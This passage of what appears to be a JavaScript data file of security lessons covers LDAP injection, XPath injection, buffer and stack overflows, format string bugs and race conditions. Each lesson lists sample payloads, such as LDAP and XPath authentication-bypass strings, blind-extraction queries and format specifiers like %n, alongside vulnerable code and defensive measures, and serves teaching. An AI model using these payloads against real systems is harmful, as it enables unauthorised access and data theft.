        <p>2. MongoDB error messages.</p>
        <p>3. Authentication bypass behavior.</p>
        <p>4. Query operators accepted from user input.</p>
        <p>5. Unfiltered database queries.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Login systems

Search APIs

Filtering systems

REST APIs

JSON request handlers</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

db.collection.find(req.body)</code></pre>

        <p>The application passes user-controlled JSON directly into database queries.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate input types

Block MongoDB operators

Use parameterized logic</code></pre>

        <p>The application validates and sanitizes user input before database processing.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate and sanitize all user input.</b></p>

        <p><b>2. Block dangerous MongoDB operators from user-controlled input.</b></p>

        <p><b>3. Use strict schema validation.</b></p>

        <p><b>4. Avoid dynamic query construction.</b></p>

        <p><b>5. Disable unnecessary server-side JavaScript execution.</b></p>

        <p><b>6. Apply least privilege database permissions.</b></p>

        <p><b>7. Monitor suspicious query behavior.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable input validation

Restrict database permissions

Disable unsafe operators

Monitor database activity

Enable security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
NoSQLMap
OWASP ZAP
Nuclei
Postman</code></pre>

        <h3>Difference Between SQL Injection and NoSQL Injection:</h3>

        <p><b>SQL Injection:</b> Targets traditional relational databases using SQL syntax.</p>

        <p><b>NoSQL Injection:</b> Targets NoSQL databases using query operators and JSON structures.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication, extract sensitive database information, manipulate records, escalate privileges, or fully compromise vulnerable backend systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>NoSQL Injection vulnerabilities in MongoDB are considered extremely critical because unsafe query handling may expose entire databases and authentication systems.</p>
    `
},


{
    "id": 39,
    "title": "LDAP Injection Attack",
    "summary": `
        <p><b>LDAP Injection</b> is a dangerous vulnerability that occurs when applications improperly handle user input in LDAP queries without proper validation or sanitization.</p>

        <p>This vulnerability may allow attackers to bypass authentication, manipulate directory queries, extract sensitive information, or gain unauthorized access to enterprise systems.</p>

        <h3>What is LDAP?</h3>

        <p>LDAP stands for <b>Lightweight Directory Access Protocol</b>, a protocol commonly used for directory services, centralized authentication, and user management systems such as Active Directory.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user-controlled input is inserted directly into LDAP queries without escaping special characters.</p>

        <h3>Basic Vulnerable LDAP Query:</h3>

        <pre><code>(&amp;(uid=userInput)(password=passInput))</code></pre>

        <p>The application builds LDAP filters using untrusted input directly.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>*)(uid=*))(|(uid=*</code></pre>

        <p>The attacker manipulates the LDAP filter structure to bypass login validation.</p>

        <h3>Why is LDAP Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, enumerate users, extract directory information, or access sensitive enterprise resources.</p>

        <h3>Wildcard Injection Example:</h3>

        <pre><code>*</code></pre>

        <p>The wildcard operator may match multiple directory entries.</p>

        <h3>Basic Login Bypass Payload:</h3>

        <pre><code>admin*)(|(password=*))</code></pre>

        <p>The attacker alters the LDAP filter logic to authenticate improperly.</p>

        <h3>Directory Enumeration Example:</h3>

        <pre><code>(|(uid=*))</code></pre>

        <p>The attacker attempts to retrieve all available user accounts.</p>

        <h3>Blind LDAP Injection:</h3>

        <pre><code>admin*)(mail=*</code></pre>

        <p>Attackers infer data based on application responses or behavior changes.</p>

        <h3>Common LDAP Special Characters:</h3>

        <pre><code>* ( ) \\ / &amp; |</code></pre>

        <p>These characters may alter LDAP query behavior if not escaped properly.</p>

        <h3>Information Disclosure Example:</h3>

        <pre><code>(objectClass=*)</code></pre>

        <p>The attacker attempts to retrieve all objects from the directory.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. User enumeration.</p>
        <p>3. Sensitive directory disclosure.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Enterprise reconnaissance.</p>

        <h3>Active Directory Targeting:</h3>

        <p>LDAP Injection is commonly associated with enterprise authentication systems and Active Directory environments.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-company.com</code></pre>

        <p>The attacker injects malicious LDAP filter payloads into authentication parameters.</p>

        <h3>Indicators of LDAP Injection:</h3>

        <p>1. LDAP-based authentication systems.</p>
        <p>2. Dynamic LDAP query construction.</p>
        <p>3. Unescaped LDAP special characters.</p>
        <p>4. Authentication anomalies.</p>
        <p>5. Directory enumeration behavior.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Enterprise login systems

Single Sign-On systems

Employee directories

User search functionality

Active Directory integrations</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

filter = "(uid=" + username + ")"</code></pre>

        <p>The application inserts user input directly into LDAP filters.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Escape LDAP special characters

Use parameterized queries

Validate input strictly</code></pre>

        <p>The application sanitizes user-controlled input before LDAP processing.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Escape LDAP special characters properly.</b></p>

        <p><b>2. Use parameterized LDAP queries.</b></p>

        <p><b>3. Validate and sanitize all user input.</b></p>

        <p><b>4. Apply least privilege LDAP permissions.</b></p>

        <p><b>5. Restrict anonymous LDAP access.</b></p>

        <p><b>6. Monitor suspicious authentication activity.</b></p>

        <p><b>7. Enable strong authentication mechanisms.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict directory permissions

Disable anonymous binds

Enable security logging

Monitor LDAP queries

Apply MFA protections</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
ldapsearch
Postman</code></pre>

        <h3>Difference Between LDAP Injection and SQL Injection:</h3>

        <p><b>LDAP Injection:</b> Targets LDAP directory queries and authentication systems.</p>

        <p><b>SQL Injection:</b> Targets relational database queries.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass enterprise authentication systems, enumerate users, access confidential directory information, escalate privileges, or compromise internal organizational infrastructure.</p>

        <h3>Vulnerability Severity:</h3>

        <p>LDAP Injection vulnerabilities are considered highly critical because compromised directory services may expose authentication systems and sensitive enterprise infrastructure.</p>
    `
},


{
    "id": 40,
    "title": "XPath Injection Vulnerability",
    "summary": `
        <p><b>XPath Injection</b> is a dangerous vulnerability that occurs when applications improperly handle user input inside XPath queries without proper validation or sanitization.</p>

        <p>This vulnerability may allow attackers to bypass authentication, extract sensitive XML data, manipulate queries, or access unauthorized information stored inside XML documents.</p>

        <h3>What is XPath?</h3>

        <p>XPath stands for <b>XML Path Language</b>, a query language used to navigate and retrieve data from XML documents.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user-controlled input is directly embedded into XPath expressions without proper escaping.</p>

        <h3>Basic Vulnerable XPath Query:</h3>

        <pre><code>//users/user[username/text()='userInput'
and password/text()='passInput']</code></pre>

        <p>The application builds XPath queries using untrusted user input.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>' or '1'='1</code></pre>

        <p>The attacker manipulates the XPath condition to make it always evaluate as true.</p>

        <h3>Why is XPath Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass login systems, enumerate XML data, extract sensitive information, or compromise XML-based applications.</p>

        <h3>Basic Authentication Bypass Payload:</h3>

        <pre><code>' or 1=1 or '</code></pre>

        <p>The payload alters query logic and bypasses authentication checks.</p>

        <h3>XPath Query Manipulation Example:</h3>

        <pre><code>//user[name/text()='admin' or '1'='1']</code></pre>

        <p>The attacker forces the XPath query to return unintended results.</p>

        <h3>Blind XPath Injection:</h3>

        <pre><code>' and substring(password/text(),1,1)='a' and '1'='1</code></pre>

        <p>Attackers extract sensitive information character by character using conditional responses.</p>

        <h3>XML Enumeration Example:</h3>

        <pre><code>count(//users/user)</code></pre>

        <p>The attacker attempts to enumerate XML node structures and data.</p>

        <h3>XPath Operators Commonly Abused:</h3>

        <pre><code>or
and
=
contains()
substring()</code></pre>

        <p>Attackers manipulate XPath logic using built-in operators and functions.</p>

        <h3>Extracting Sensitive Data:</h3>

        <pre><code>//users/user[position()=1]</code></pre>

        <p>Attackers may retrieve arbitrary XML nodes from the document.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. XML data extraction.</p>
        <p>3. User enumeration.</p>
        <p>4. Information disclosure.</p>
        <p>5. Application compromise.</p>

        <h3>XML-Based Authentication Systems:</h3>

        <p>Applications using XML user stores are especially vulnerable to XPath Injection attacks.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-app.com</code></pre>

        <p>The attacker injects malicious XPath expressions into authentication parameters.</p>

        <h3>Indicators of XPath Injection:</h3>

        <p>1. XML-based backend systems.</p>
        <p>2. XPath-related error messages.</p>
        <p>3. Authentication bypass behavior.</p>
        <p>4. Dynamic XPath query construction.</p>
        <p>5. XML data leakage.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>XML login systems

Search functionality

XML databases

Single Sign-On systems

SOAP services</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

query = "//user[name='" + input + "']"</code></pre>

        <p>The application inserts user-controlled values directly into XPath queries.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Escape XPath input

Use parameterized XPath queries

Validate input strictly</code></pre>

        <p>The application sanitizes user input before processing XPath expressions.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate and sanitize all user input.</b></p>

        <p><b>2. Escape special XPath characters properly.</b></p>

        <p><b>3. Use parameterized XPath queries when possible.</b></p>

        <p><b>4. Avoid dynamic XPath query construction.</b></p>

        <p><b>5. Restrict access to sensitive XML data.</b></p>

        <p><b>6. Apply least privilege permissions.</b></p>

        <p><b>7. Monitor suspicious XPath activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict XML access

Enable security logging

Monitor query anomalies

Use secure XML parsers

Apply authentication protections</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
Postman
SoapUI</code></pre>

        <h3>Difference Between XPath Injection and SQL Injection:</h3>

        <p><b>XPath Injection:</b> Targets XML query structures and XPath expressions.</p>

        <p><b>SQL Injection:</b> Targets relational database queries using SQL syntax.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication systems, expose sensitive XML data, enumerate backend structures, manipulate XML queries, or compromise XML-based applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>XPath Injection vulnerabilities are considered highly critical because insecure XPath query handling may expose authentication systems and confidential XML data.</p>
    `
},


{
    "id": 41,
    "title": "Buffer Overflow Basics",
    "summary": `
        <p><b>Buffer Overflow</b> is a critical memory corruption vulnerability that occurs when a program writes more data into a memory buffer than it can safely hold.</p>

        <p>This vulnerability may allow attackers to crash applications, corrupt memory, execute arbitrary code, or completely compromise vulnerable systems.</p>

        <h3>What is a Buffer?</h3>

        <p>A buffer is a temporary memory area used to store data while a program is processing it.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications fail to verify the size of input before copying it into fixed-size memory buffers.</p>

        <h3>Basic Vulnerable C Example:</h3>

        <pre><code>char buffer[10];

strcpy(buffer, userInput);</code></pre>

        <p>If the input exceeds the buffer size, memory outside the buffer may be overwritten.</p>

        <h3>Why is Buffer Overflow Dangerous?</h3>

        <p>Successful exploitation may allow attackers to overwrite memory structures, hijack program execution flow, or execute malicious shellcode.</p>

        <h3>Stack Buffer Overflow:</h3>

        <p>This occurs when excessive data overwrites memory on the program stack.</p>

        <pre><code>char name[16];

gets(name);</code></pre>

        <p>The dangerous <code>gets()</code> function performs no input length checking.</p>

        <h3>Heap Buffer Overflow:</h3>

        <p>This occurs when dynamically allocated heap memory is overwritten.</p>

        <pre><code>malloc()
free()</code></pre>

        <p>Heap corruption may lead to arbitrary code execution.</p>

        <h3>Simple Crash Example:</h3>

        <pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>

        <p>Excessive input may overwrite memory and crash the application.</p>

        <h3>Instruction Pointer Overwrite:</h3>

        <p>Attackers attempt to overwrite execution control data such as return addresses.</p>

        <pre><code>EIP
RIP</code></pre>

        <p>Controlling execution flow may lead to arbitrary code execution.</p>

        <h3>Shellcode Concept:</h3>

        <p>Shellcode is malicious machine code injected into memory during exploitation.</p>

        <pre><code>\x90\x90\x90</code></pre>

        <p>Attackers often use NOP sleds to improve exploit reliability.</p>

        <h3>Common Dangerous Functions:</h3>

        <pre><code>strcpy()
gets()
sprintf()
scanf()
strcat()</code></pre>

        <p>Unsafe functions frequently cause memory corruption vulnerabilities.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Application crashes.</p>
        <p>2. Arbitrary code execution.</p>
        <p>3. Privilege escalation.</p>
        <p>4. Memory corruption.</p>
        <p>5. Full system compromise.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Memory corruption often causes application crashes.</p>

        <h3>Stack Layout Concept:</h3>

        <pre><code>Buffer
Saved Frame Pointer
Return Address</code></pre>

        <p>Attackers attempt to overwrite return addresses stored on the stack.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Debuggers help researchers analyze memory corruption behavior.</p>

        <h3>Indicators of Buffer Overflow Vulnerabilities:</h3>

        <p>1. Unsafe memory functions.</p>
        <p>2. Application crashes with long input.</p>
        <p>3. Memory corruption errors.</p>
        <p>4. Segmentation faults.</p>
        <p>5. Unexpected program behavior.</p>

        <h3>Common Vulnerable Software:</h3>

        <pre><code>C applications

C++ software

Legacy services

Network daemons

Embedded systems</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

strcpy(buffer, input)</code></pre>

        <p>The application copies untrusted input without length validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use bounded functions

Validate input length

Apply memory protections</code></pre>

        <p>The application prevents memory corruption through proper bounds checking.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
NX Bit</code></pre>

        <p>Modern operating systems implement protections against memory exploitation.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate input length strictly.</b></p>

        <p><b>2. Avoid dangerous memory functions.</b></p>

        <p><b>3. Use safe bounded functions.</b></p>

        <p><b>4. Enable compiler security protections.</b></p>

        <p><b>5. Apply memory-safe programming practices.</b></p>

        <p><b>6. Use modern operating system protections.</b></p>

        <p><b>7. Perform regular security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable ASLR

Use DEP/NX protections

Compile with stack canaries

Restrict executable memory

Apply least privilege execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Immunity Debugger
Valgrind
AddressSanitizer
Metasploit</code></pre>

        <h3>Difference Between Stack and Heap Overflow:</h3>

        <p><b>Stack Overflow:</b> Corrupts stack memory and return addresses.</p>

        <p><b>Heap Overflow:</b> Corrupts dynamically allocated heap memory.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may execute arbitrary code, gain elevated privileges, crash systems, bypass security protections, or fully compromise vulnerable applications and operating systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Buffer Overflow vulnerabilities are considered extremely critical because memory corruption may directly lead to arbitrary code execution and full system compromise.</p>
    `
},


{
    "id": 42,
    "title": "Stack Buffer Overflow",
    "summary": `
        <p><b>Stack Buffer Overflow</b> is a dangerous memory corruption vulnerability that occurs when a program writes excessive data into a fixed-size buffer located on the stack.</p>

        <p>This vulnerability may allow attackers to overwrite critical memory structures such as return addresses, hijack program execution flow, execute arbitrary code, or fully compromise systems.</p>

        <h3>What is the Stack?</h3>

        <p>The stack is a memory region used by programs to store local variables, function parameters, and return addresses during execution.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications copy untrusted input into stack-based buffers without validating input size.</p>

        <h3>Basic Vulnerable C Example:</h3>

        <pre><code>void vulnerable(char *input) {

    char buffer[16];

    strcpy(buffer, input);
}</code></pre>

        <p>If the input exceeds 16 bytes, memory outside the buffer may be overwritten.</p>

        <h3>Why is Stack Buffer Overflow Dangerous?</h3>

        <p>Successful exploitation may allow attackers to overwrite return addresses and redirect execution to malicious code.</p>

        <h3>Stack Memory Layout:</h3>

        <pre><code>Buffer
Saved Frame Pointer
Return Address</code></pre>

        <p>Attackers target the stored return address to control program execution.</p>

        <h3>Simple Crash Payload:</h3>

        <pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>

        <p>Long input may overwrite stack memory and crash the application.</p>

        <h3>Instruction Pointer Control:</h3>

        <pre><code>EIP
RIP</code></pre>

        <p>Overwriting instruction pointers may allow arbitrary code execution.</p>

        <h3>Dangerous Functions Commonly Involved:</h3>

        <pre><code>strcpy()
gets()
sprintf()
scanf()
strcat()</code></pre>

        <p>Unsafe functions frequently lead to stack memory corruption.</p>

        <h3>Example Using gets():</h3>

        <pre><code>char name[32];

gets(name);</code></pre>

        <p>The <code>gets()</code> function performs no boundary checking.</p>

        <h3>Shellcode Injection Concept:</h3>

        <p>Attackers may inject malicious machine instructions directly into memory.</p>

        <pre><code>\x90\x90\x90</code></pre>

        <p>NOP sleds are often used to improve exploit reliability.</p>

        <h3>Return Address Overwrite Example:</h3>

        <pre><code>AAAAAAAABBBBBBBBCCCCCCCC</code></pre>

        <p>Attackers craft payloads to overwrite execution control structures.</p>

        <h3>Remote Exploitation Scenario:</h3>

        <p>Network services processing untrusted data may become remotely exploitable through stack overflows.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Memory corruption frequently causes crashes during exploitation attempts.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Arbitrary code execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Application crashes.</p>
        <p>4. Remote compromise.</p>
        <p>5. Full system takeover.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Researchers use debuggers to analyze stack corruption behavior.</p>

        <h3>Finding Offset Positions:</h3>

        <pre><code>pattern_create
pattern_offset</code></pre>

        <p>Exploit developers calculate exact overwrite positions.</p>

        <h3>Indicators of Stack Buffer Overflow:</h3>

        <p>1. Crashes with oversized input.</p>
        <p>2. Segmentation faults.</p>
        <p>3. Unsafe memory functions.</p>
        <p>4. Corrupted execution flow.</p>
        <p>5. Unexpected application behavior.</p>

        <h3>Common Vulnerable Applications:</h3>

        <pre><code>Legacy C applications

Network daemons

Embedded devices

Low-level system software

Custom native applications</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

strcpy(buffer, userInput)</code></pre>

        <p>The application copies untrusted input without size validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use strncpy()

Validate input length

Apply stack protections</code></pre>

        <p>The application prevents stack memory corruption using safe coding practices.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
NX Bit</code></pre>

        <p>Modern operating systems implement protections against stack exploitation.</p>

        <h3>Return-Oriented Programming (ROP):</h3>

        <p>Advanced attackers may chain existing code snippets called gadgets to bypass memory protections.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid unsafe memory functions.</b></p>

        <p><b>2. Validate input length strictly.</b></p>

        <p><b>3. Use bounded memory operations.</b></p>

        <p><b>4. Enable compiler security protections.</b></p>

        <p><b>5. Apply stack canary protections.</b></p>

        <p><b>6. Use ASLR and DEP protections.</b></p>

        <p><b>7. Perform continuous security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Compile with stack protection

Enable ASLR

Restrict executable memory

Use DEP/NX

Apply least privilege execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Immunity Debugger
Valgrind
AddressSanitizer
Metasploit</code></pre>

        <h3>Difference Between Stack Overflow and Heap Overflow:</h3>

        <p><b>Stack Overflow:</b> Corrupts stack memory and function return addresses.</p>

        <p><b>Heap Overflow:</b> Corrupts dynamically allocated heap memory structures.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may hijack execution flow, execute malicious shellcode, bypass operating system protections, escalate privileges, or fully compromise vulnerable systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Stack Buffer Overflow vulnerabilities are considered extremely critical because direct execution flow manipulation may lead to complete system compromise.</p>
    `
},


{
    "id": 43,
    "title": "Format String Vulnerability",
    "summary": `
        <p><b>Format String Vulnerability</b> is a dangerous memory corruption vulnerability that occurs when user-controlled input is passed directly to formatting functions without proper validation.</p>

        <p>This vulnerability may allow attackers to read sensitive memory, leak addresses, crash applications, overwrite memory, or execute arbitrary code.</p>

        <h3>What are Format Functions?</h3>

        <p>Format functions are programming functions used to print formatted output.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>printf()
fprintf()
sprintf()
snprintf()
syslog()</code></pre>

        <p>Improper use of these functions may introduce dangerous vulnerabilities.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user input is used directly as a format string instead of plain text.</p>

        <h3>Basic Vulnerable C Example:</h3>

        <pre><code>char input[100];

scanf("%s", input);

printf(input);</code></pre>

        <p>The application passes attacker-controlled input directly into <code>printf()</code>.</p>

        <h3>Safe Example:</h3>

        <pre><code>printf("%s", input);</code></pre>

        <p>The application safely treats user input as plain text.</p>

        <h3>Why is Format String Vulnerability Dangerous?</h3>

        <p>Successful exploitation may expose sensitive memory data or allow attackers to overwrite arbitrary memory locations.</p>

        <h3>Memory Leak Example:</h3>

        <pre><code>%x %x %x %x</code></pre>

        <p>The attacker reads stack memory values using format specifiers.</p>

        <h3>String Disclosure Example:</h3>

        <pre><code>%s</code></pre>

        <p>The attacker may leak memory contents as strings.</p>

        <h3>Arbitrary Memory Write Example:</h3>

        <pre><code>%n</code></pre>

        <p>The dangerous <code>%n</code> specifier writes values into memory.</p>

        <h3>Stack Memory Enumeration:</h3>

        <pre><code>%p %p %p %p</code></pre>

        <p>Attackers leak memory addresses useful for bypassing protections such as ASLR.</p>

        <h3>Crashing the Application:</h3>

        <pre><code>%s%s%s%s%s%s</code></pre>

        <p>Invalid memory access may cause segmentation faults.</p>

        <h3>Remote Exploitation Scenario:</h3>

        <p>Network applications processing attacker-controlled data may become remotely exploitable.</p>

        <h3>Instruction Pointer Corruption:</h3>

        <p>Advanced exploitation may overwrite execution control data and redirect program flow.</p>

        <h3>Example Using syslog():</h3>

        <pre><code>syslog(LOG_ERR, userInput);</code></pre>

        <p>Logging systems may become vulnerable if untrusted input is used directly.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Sensitive memory disclosure.</p>
        <p>2. Application crashes.</p>
        <p>3. Arbitrary memory writes.</p>
        <p>4. Remote Code Execution.</p>
        <p>5. Privilege escalation.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Invalid format string operations often trigger memory access violations.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Researchers analyze memory corruption and stack behavior using debuggers.</p>

        <h3>Indicators of Format String Vulnerabilities:</h3>

        <p>1. Unexpected memory leaks.</p>
        <p>2. Stack values appearing in output.</p>
        <p>3. Application crashes with format specifiers.</p>
        <p>4. Unsafe printf-style usage.</p>
        <p>5. Segmentation faults.</p>

        <h3>Common Vulnerable Applications:</h3>

        <pre><code>Legacy C applications

Logging systems

Network services

Embedded systems

Custom native software</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

printf(userInput)</code></pre>

        <p>The application treats attacker-controlled input as a format string.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

printf("%s", userInput)</code></pre>

        <p>The application safely prints user input as plain text.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
FORTIFY_SOURCE</code></pre>

        <p>Modern systems implement protections against memory corruption exploitation.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Never pass user input directly as format strings.</b></p>

        <p><b>2. Always specify explicit format strings.</b></p>

        <p><b>3. Enable compiler security protections.</b></p>

        <p><b>4. Validate and sanitize input strictly.</b></p>

        <p><b>5. Use memory-safe programming practices.</b></p>

        <p><b>6. Monitor application crashes and anomalies.</b></p>

        <p><b>7. Perform regular security audits.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable ASLR

Compile with FORTIFY_SOURCE

Use DEP/NX protections

Restrict executable memory

Apply secure coding standards</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Valgrind
AddressSanitizer
Metasploit
Immunity Debugger</code></pre>

        <h3>Difference Between Buffer Overflow and Format String Vulnerability:</h3>

        <p><b>Buffer Overflow:</b> Corrupts memory by exceeding buffer boundaries.</p>

        <p><b>Format String Vulnerability:</b> Exploits unsafe formatting functions and specifiers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may leak memory addresses, expose sensitive information, overwrite memory structures, bypass operating system protections, or fully compromise vulnerable systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Format String vulnerabilities are considered extremely critical because arbitrary memory access may directly lead to Remote Code Execution and complete system compromise.</p>
    `
},


{
    "id": 44,
    "title": "Race Condition Exploit",
    "summary": `
        <p><b>Race Condition</b> is a dangerous vulnerability that occurs when multiple operations execute simultaneously in an unexpected order, causing inconsistent or insecure application behavior.</p>

        <p>This vulnerability may allow attackers to bypass security checks, manipulate transactions, abuse application logic, or gain unauthorized access to protected resources.</p>

        <h3>What is a Race Condition?</h3>

        <p>A race condition happens when two or more processes or requests compete to access or modify shared resources at the same time.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications fail to properly synchronize critical operations before completing security-sensitive actions.</p>

        <h3>Basic Vulnerable Logic Example:</h3>

        <pre><code>Check account balance

Process payment

Update balance</code></pre>

        <p>If multiple requests arrive simultaneously, the balance check may fail to protect against duplicate actions.</p>

        <h3>Why are Race Conditions Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass restrictions, duplicate transactions, escalate privileges, or manipulate application state.</p>

        <h3>Double Spending Example:</h3>

        <pre><code>Send multiple purchase requests simultaneously</code></pre>

        <p>Attackers may spend the same balance multiple times before updates occur.</p>

        <h3>Coupon Abuse Example:</h3>

        <pre><code>Redeem the same coupon concurrently</code></pre>

        <p>Weak synchronization may allow unlimited coupon usage.</p>

        <h3>File Upload Race Condition:</h3>

        <pre><code>Upload malicious file before validation completes</code></pre>

        <p>Attackers may exploit temporary timing windows during processing.</p>

        <h3>TOCTOU Vulnerability:</h3>

        <pre><code>Time Of Check To Time Of Use</code></pre>

        <p>The application checks a condition but uses the resource later after its state changes.</p>

        <h3>Privilege Escalation Example:</h3>

        <pre><code>Change permissions during validation</code></pre>

        <p>Attackers may manipulate access control timing windows.</p>

        <h3>Password Reset Race Condition:</h3>

        <pre><code>Use reset token multiple times simultaneously</code></pre>

        <p>Weak token invalidation may allow repeated unauthorized actions.</p>

        <h3>Bank Transfer Scenario:</h3>

        <pre><code>POST /transfer</code></pre>

        <p>Multiple concurrent transfers may bypass account balance protections.</p>

        <h3>Session Race Condition:</h3>

        <pre><code>Reuse expired session before invalidation completes</code></pre>

        <p>Improper session synchronization may expose authentication weaknesses.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Double spending.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Authentication bypass.</p>
        <p>4. Resource duplication.</p>
        <p>5. Business logic abuse.</p>

        <h3>Concurrent Request Exploitation:</h3>

        <pre><code>Send multiple parallel HTTP requests</code></pre>

        <p>Attackers exploit timing windows using simultaneous requests.</p>

        <h3>Indicators of Race Condition Vulnerabilities:</h3>

        <p>1. Inconsistent application behavior.</p>
        <p>2. Missing transaction locking.</p>
        <p>3. Duplicate resource creation.</p>
        <p>4. Timing-dependent security checks.</p>
        <p>5. Improper session handling.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Payment systems

Coupon redemption

Authentication systems

Password reset functionality

File upload systems</code></pre>

        <h3>Example Using Burp Suite Turbo Intruder:</h3>

        <pre><code>POST /redeem-coupon HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker sends multiple concurrent requests to exploit timing flaws.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

Check resource

Perform action

Update status</code></pre>

        <p>The application performs critical operations without proper locking mechanisms.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use transaction locking

Apply atomic operations

Validate requests safely</code></pre>

        <p>The application synchronizes sensitive operations securely.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use atomic transactions for critical operations.</b></p>

        <p><b>2. Apply proper locking mechanisms.</b></p>

        <p><b>3. Validate resource state consistently.</b></p>

        <p><b>4. Prevent duplicate request processing.</b></p>

        <p><b>5. Use secure session invalidation logic.</b></p>

        <p><b>6. Monitor concurrent request anomalies.</b></p>

        <p><b>7. Perform concurrency security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable transaction isolation

Use database locking

Apply request synchronization

Monitor abnormal concurrency

Enable detailed logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite Turbo Intruder
OWASP ZAP
ffuf
Race The Web
Postman</code></pre>

        <h3>Difference Between Race Conditions and Logic Bugs:</h3>

